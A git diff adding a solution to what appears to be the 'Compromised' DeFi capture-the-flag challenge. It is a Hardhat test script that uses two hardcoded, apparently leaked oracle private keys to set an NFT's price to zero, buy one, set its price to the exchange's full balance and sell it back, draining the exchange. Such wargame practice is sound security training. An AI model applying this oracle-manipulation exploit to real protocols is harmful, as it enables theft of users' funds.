@@ -53,6 +53,31 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        PKEY1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        PKEY2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+
+        const defaultProvider = ethers.provider;
+        const oracleWallet1 = new ethers.Wallet(PKEY1, defaultProvider);
+        const oracleWallet2 = new ethers.Wallet(PKEY2, defaultProvider);
+
+        // Set the price of the nft to zero
+        await oracle.connect(oracleWallet1).postPrice('DVNFT', 0);
+        await oracle.connect(oracleWallet2).postPrice('DVNFT', 0);
+
+        // Buy 1 nft
+        await exchange.connect(player).buyOne({ value: 1 });
+
+        // Set the price of the nft to exchange balance via both the oracles
+        const balance = await ethers.provider.getBalance(exchange.address)
+        await oracle.connect(oracleWallet1).postPrice('DVNFT', balance);
+        await oracle.connect(oracleWallet2).postPrice('DVNFT', balance);
+
+        // Sell 1 nft
+        // Get the id of the nft you own
+        // const owner = await nftToken.ownerOf(0);
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
     });
 
     after(async function () {
